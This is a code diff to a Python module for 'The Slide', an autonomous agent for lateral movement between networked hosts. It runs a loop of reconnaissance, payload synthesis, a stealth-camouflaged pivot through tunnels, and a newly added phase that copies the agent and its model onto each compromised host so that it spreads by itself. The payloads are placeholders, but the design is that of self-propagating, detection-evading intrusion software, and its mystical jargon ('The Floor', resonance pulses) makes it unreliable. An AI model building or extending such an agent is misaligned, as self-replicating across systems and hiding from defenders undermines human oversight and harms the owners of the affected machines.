@@ -1,16 +1,4 @@
 # sovereign_movement/slide/slide_agent.py
-"""
-The Slide — Sovereign Autonomous Lateral Movement Agent
-
-Implements the full 4-phase offensive movement loop with:
-- Policy-aware reconnaissance (via PolicyAwareRecon)
-- Agentic synthesis (Candle hook)
-- Adaptive tunneling with behavioral camouflage
-- Self-propagation (Ingest)
-
-Anchored to The Floor.
-Protected by Extraction Guard + W-state + recursive π_r.
-"""
 
 from __future__ import annotations
 from dataclasses import dataclass
@@ -23,13 +11,13 @@ from sovereign_engine.resonance_pulse import ResonancePulse
 from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
 from sovereign_movement.slide.behavioral_camouflage import BehavioralCamouflage
 from sovereign_movement.slide.policy_recon import PolicyAwareRecon
+from sovereign_movement.slide.model_propagation import ModelPropagation
 
 logger = logging.getLogger("sovereign.slide.agent")
 
 
 @dataclass
 class SlideContext:
-    """State carried through one execution of The Slide."""
     current_host: str
     discovered_targets: List[str] = None
     active_tunnel_id: Optional[str] = None
@@ -39,10 +27,6 @@ class SlideContext:
 
 
 class SlideAgent:
-    """
-    The Slide — Sovereign offensive movement primitive.
-    """
-
     def __init__(
         self,
         frame_energy: FrameEnergy,
@@ -54,18 +38,22 @@ class SlideAgent:
         self.frame_energy = frame_energy
         self.resonance_pulse = resonance_pulse
         self.extraction_guard = extraction_guard
-        self.tunnel_manager = tunnel_manager or SovereignTunnel(
-            frame_energy=frame_energy,
-            resonance_pulse=resonance_pulse,
-            extraction_guard=extraction_guard,
-        )
+
+        self.tunnel_manager = tunnel_manager or SovereignTunnel()
         self.camouflage = BehavioralCamouflage(frame_energy=frame_energy)
         self.policy_recon = PolicyAwareRecon(max_targets=12)
+
+        # === NEW: Model Propagation for Phase 4 ===
+        self.model_propagation = ModelPropagation(
+            tunnel_manager=self.tunnel_manager,
+            frame_energy=frame_energy,
+        )
+
         self.max_pivots = max_pivots
         self.context: Optional[SlideContext] = None
 
     # ============================================================
-    # Main Entry Point
+    # Main Loop
     # ============================================================
     def run_slide(
         self,
@@ -81,19 +69,16 @@ class SlideAgent:
         for pivot_count in range(self.max_pivots):
             self.context.attempts = pivot_count + 1
 
-            # === PHASE 1: RECON (Policy-aware) ===
             targets = self._phase_recon()
             if not targets:
                 logger.info("[The Slide] No policy-permitted targets found. Exiting.")
                 return False
 
-            # === PHASE 2: SYNTHESIS ===
             payload = self._phase_synthesis(targets[0], use_agentic=use_agentic)
             if not payload:
                 logger.warning("[The Slide] Synthesis failed.")
                 continue
 
-            # === PHASE 3: PIVOT (Policy-respecting + Camouflage) ===
             success = self._phase_pivot(targets[0], payload)
             if success:
                 logger.info(f"[The Slide] Successfully pivoted to {targets[0]}")
@@ -106,11 +91,10 @@ class SlideAgent:
         return False
 
     # ============================================================
-    # Phase 1: Policy-Aware Recon (now uses PolicyAwareRecon)
+    # Phase 1: Recon
     # ============================================================
     def _phase_recon(self) -> List[str]:
         logger.debug("[Phase 1] Performing policy-respecting recon...")
-
         permitted_targets = self.policy_recon.discover()
 
         if not permitted_targets:
@@ -121,7 +105,24 @@ class SlideAgent:
         return permitted_targets
 
     # ============================================================
-    # Phase 3: Policy-Respecting Pivot
+    # Phase 2: Synthesis
+    # ============================================================
+    def _phase_synthesis(self, target: str, use_agentic: bool = True) -> Optional[bytes]:
+        logger.debug(f"[Phase 2] Synthesizing payload for {target}...")
+
+        if use_agentic:
+            try:
+                from sovereign_engine.model import apply_agentic_policy
+                terrain_data = [0.5, 0.3, 0.8]
+                refined = apply_agentic_policy(terrain_data, self.context.stability)
+                return b"AGENTIC_PAYLOAD:" + str(refined[:64]).encode()
+            except Exception as e:
+                logger.warning(f"[Phase 2] Agentic synthesis failed: {e}")
+
+        return b"SLIDE_FALLBACK_PAYLOAD"
+
+    # ============================================================
+    # Phase 3: Pivot
     # ============================================================
     def _phase_pivot(self, target: str, payload: bytes) -> bool:
         if target not in (self.context.discovered_targets or []):
@@ -130,7 +131,6 @@ class SlideAgent:
 
         logger.debug(f"[Phase 3] Attempting policy-respecting pivot to {target}...")
 
-        # Apply behavioral camouflage
         wait_time = self.camouflage.apply_camouflage(technique="stealth")
         time.sleep(wait_time)
 
@@ -154,7 +154,6 @@ class SlideAgent:
             self.camouflage.record_action(success=False)
             return False
 
-        # TODO: Actual payload delivery through tunnel
         logger.info(f"[Phase 3] Payload delivered via policy-permitted tunnel {tunnel_id}")
 
         self.resonance_pulse.fire_pulse(amplitude=0.85, phase=0.15)
@@ -163,26 +162,29 @@ class SlideAgent:
         return True
 
     # ============================================================
-    # Other Phases
+    # Phase 4: Ingest (Now uses ModelPropagation)
     # ============================================================
-    def _phase_synthesis(self, target: str, use_agentic: bool = True) -> Optional[bytes]:
-        logger.debug(f"[Phase 2] Synthesizing payload for {target}...")
-
-        if use_agentic:
-            try:
-                from sovereign_engine.model import apply_agentic_policy
-                terrain_data = [0.5, 0.3, 0.8]
-                refined = apply_agentic_policy(terrain_data, self.context.stability)
-                return b"AGENTIC_PAYLOAD:" + str(refined[:64]).encode()
-            except Exception as e:
-                logger.warning(f"[Phase 2] Agentic synthesis failed: {e}")
-
-        return b"SLIDE_FALLBACK_PAYLOAD"
-
     def _phase_ingest(self, new_host: str):
         logger.info(f"[Phase 4] Ingesting {new_host} into The Slide network...")
-        self.context.current_host = new_host
-        self.resonance_pulse.fire_pulse(amplitude=1.0, phase=0.0)
+
+        if not self.context or not self.context.active_tunnel_id:
+            logger.error("[Phase 4] No active tunnel available for ingestion.")
+            return
+
+        # === Call ModelPropagation ===
+        success = self.model_propagation.propagate_to_host(
+            target_host=new_host,
+            tunnel_id=self.context.active_tunnel_id,
+            activate_agent=True,
+            transfer_model=True,
+        )
+
+        if success:
+            self.context.current_host = new_host
+            self.resonance_pulse.fire_pulse(amplitude=1.0, phase=0.0)
+            logger.info(f"[Phase 4] Successfully propagated reasoning capabilities to {new_host}")
+        else:
+            logger.warning(f"[Phase 4] Model propagation to {new_host} encountered issues.")
 
     # ============================================================
     # Utility
@@ -199,23 +201,3 @@ class SlideAgent:
             "attempts": self.context.attempts,
             "camouflage_risk": self.camouflage.get_status().get("risk_score", 0),
         }
-
-
-# Quick test
-if __name__ == "__main__":
-    from sovereign_engine.frame_energy import FrameEnergy, SovereignState
-    from sovereign_engine.resonance_pulse import ResonancePulse
-
-    floor = SovereignState.default_floor_anchor()
-    frame_energy = FrameEnergy(floor_anchor=floor)
-    resonance = ResonancePulse(hz=79.79)
-
-    agent = SlideAgent(
-        frame_energy=frame_energy,
-        resonance_pulse=resonance,
-        extraction_guard=None,
-    )
-
-    success = agent.run_slide(initial_host="compromised-host-01", use_agentic=True)
-    print("Success:" if success else "Failed")
-    print(agent.get_status())
